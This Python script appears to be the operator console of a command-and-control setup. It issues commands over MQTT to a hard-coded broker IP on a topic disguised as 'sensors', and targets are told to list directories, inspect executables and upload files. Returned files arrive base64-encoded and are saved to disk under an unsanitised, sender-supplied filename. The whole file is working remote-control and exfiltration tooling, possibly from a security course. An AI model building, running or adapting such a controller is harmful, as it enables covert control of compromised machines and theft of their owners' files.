import base64
import os

import paho.mqtt.client as mqtt
import json
import time
import random

# Conf
MQTT_BROKER = "147.32.82.209"
PORT = 1883
TOPIC = "sensors"
CONTROLLER_ID = "controller_" + str(random.randint(1, 100))


def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print(f"Controller {CONTROLLER_ID} connected.")
        client.subscribe(TOPIC)
    else:
        print(f"Connection failed. Code: {rc}")


def send_command(client, target_id, action, params=None):
    payload = {
        "sensor_id": target_id,
        "sender_id": CONTROLLER_ID,
        "action": action,
        "params": params or {},
        "timestamp": time.time()
    }
    message = json.dumps(payload)

    client.publish(TOPIC, message)
    print(f"Sent: {action} to {target_id}")
    time.sleep(2)


def on_message(client, userdata, msg):
    try:
        payload = json.loads(msg.payload.decode())

        # Message for me?
        target = payload.get("controller_id")
        if target != CONTROLLER_ID:
            return

        sender = payload.get("sender_id")
        response_type = payload.get("type")

        if response_type == "log_file":
            content_str = payload.get("payload")
            filename = payload.get("file_name")
            if not filename:
                ext = ".txt"
                filename = f"{sender}_{int(time.time())}{ext}"

            if not os.path.exists("received"):
                os.makedirs("received")

            save_path = os.path.join("received", filename)

            try:
                file_data = base64.b64decode(content_str)

                with open(save_path, 'wb') as f:
                    f.write(file_data)

                print(f"File successfully saved to: {save_path}")
            except Exception as e:
                print(f"Error: {e}")

        print(f"Received message from {sender}:\n{msg.payload.decode()}")

    except Exception as e:
        pass
        # print(f"Error processing message: {e}")


def main():
    client = mqtt.Client(client_id=CONTROLLER_ID)
    client.on_connect = on_connect
    client.on_message = on_message

    try:
        client.connect(MQTT_BROKER, PORT, 60)
        client.loop_start()

        time.sleep(1)

        while True:
            cmd = input("Enter command: ")
            if cmd == "exit":
                break

            if cmd == "announce":
                send_command(client, "all", "announce")
            else:
                target_id = input("Target ID: ")
                params = None
                if cmd == "ls":
                    params = input("Path (optional): ")
                elif cmd == "log":
                    params = input("Path to file: ")
                elif cmd == "s_info":
                    params = input("Path to executable: ")

                send_command(client, target_id, cmd, params)

        client.loop_stop()
    except KeyboardInterrupt:
        print("Stopping...")
    except Exception as e:
        print(f"Error: {e}")


if __name__ == '__main__':
    main()
